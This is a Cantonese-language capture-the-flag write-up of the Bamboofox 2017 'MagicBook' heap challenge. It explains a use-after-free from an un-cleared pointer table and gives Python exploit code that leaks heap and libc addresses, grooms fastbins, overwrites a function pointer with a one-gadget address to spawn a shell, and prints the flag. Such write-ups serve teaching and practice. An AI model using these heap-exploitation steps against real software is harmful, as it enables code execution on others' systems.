# Bamboofox 2017 MagicBook

呢條係好簡單嘅heap overflow題,本身就應該solve到既(可惜揾錯one gadget RCE address),係到要推介下hitcon david 大大嘅 [One_gadget](https://github.com/david942j/one_gadget) ,有佢就唔洗係IDA Pro 揾(錯) one gadget RCE 

Menu:
```

oh my god!!!!
You are just a normal human.......
You can only use at most five kinds of magic (vanished).

====== Magic Book ======
  1. Add a chant.

  2. Delete a chant.

  3. spell it !!!

========================
Choose a feature :

```

有得add, delete同 spell.

Spell就係用黎call print chant 嘅 option,同時print chant本身都係chant object嘅一枝function pointer(好重要)

每一次‵call add, 首先會malloc 一個 0x10嘅chunk 放function pointer 同content pointer, 再malloc 一個由用家input size 嘅chunk 去放input content

heap view :
```
0x603010:	0x0000000000400826	0x0000000000603030
0x603020:	0x0000000000000000	0x0000000000000021
0x603030:	0x4141414141414141	0x000000000000000a
0x603040:	0x0000000000000000	0x0000000000020fc1
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000

```

而佢又有另一個table store heap address

```
0x6020a0 <list>:	0x0000000000603010	0x0000000000000000
0x6020b0 <list+16>:	0x0000000000000000	0x0000000000000000
0x6020c0 <list+32>:	0x0000000000000000	0x0000000000000000

```
個bug就係呢到,free完之後上面個table,係相應位置冇set 0,引致use after free

可以開始exploit 

不過由於無edit function 所以我地唔可以用unlink->GOT Hijacking 

普通fastbin attack 都唔得,因為add 會先malloc function pointer chunk再malloc content chunk

由於我地控制唔到function pointer chunk 會去乜位所以就會crash 

不過點都好我地都要leak libc, heapbase (呢到無用)

```python
print "[+] Leaking heapbase : "
add(0,128,"AAAA")
add(1,128,"BBBB")
add(2,128,"CCCC")
add(3,128,"AAAA")
free(0)
free(2)
add(0,128,"DDDDDDD")
leakk=leak("DDDDDDD",0)
heapbase=int(leakk,16)-0x180
print "heapbase :"+hex(heapbase)
add(2,128,"DDDDDDD")
free(3)
free(2)
free(1)
free(0)

print "[+] Leaking Libc : "
add(0,128,"AAAA")
add(1,128,"BBBB")
add(2,128,"CCCC")
free(0)
add(0,128,"DDDDDDD")
leakk=leak("DDDDDDD",0)
```

只要利用smallbin free完之後嘅fd bk pointer再配合puts leak libc heapbase 出黎(可以參考[Mental Snapshot - _int_free and unlink](http://uaf.io/exploitation/misc/2016/09/11/_int_free-Mental-Snapshot.html))  

Exploit :

首先我地要malloc 一個Fastbin with content <0x20 嘅chunk 加兩個好大嘅chunk ,1個 padding (add(3,128,"X"))
)

係malloc 細chunk(add(0,30,"X"))嘅時候,由於function pointer chunk同content pointer chunk屬於0x20 bin ,就會拎返屬於以前table[0] table[1] function pointer 嘅address

```python
add(0,30,"X")
add(1,800,"T"*300)
add(2,500,"B"*300)
add(3,128,"X")
```
再用呢個次序free左佢
 
咁下一次malloc嘅function pointer chunk 位置會拎到上面細chunk content位置(fastbin LIFO features)

Content chunk 會放左係之後,而且會覆蓋到以前嘅chunk(2 and 3)

```python
free(3)
free(2)
free(1)
free(0)
```
再一個大chunk (size=900)我地會完整覆蓋到以前嘅chunk 3
 
係chunk 3 function pointer chunk 位置放one gadget
利用use after free 走去menu spell->3 get shell

```python
known_heap=heapbase+0x190
rop=p64(pop_rax_ret)+p64(system)
add(1,900,"Q"*(96+48)+p64(one_gadget))
print "[+] Get Shell "
r.sendline("3")
r.recvuntil(":")
r.sendline("3")
r.sendline("ls -al")


```

Flag:

```
BAMBOOFOX{Hehehe...R3M3m6er_t0_s3T_Ni1_aFt3r_Fr3333333}
```


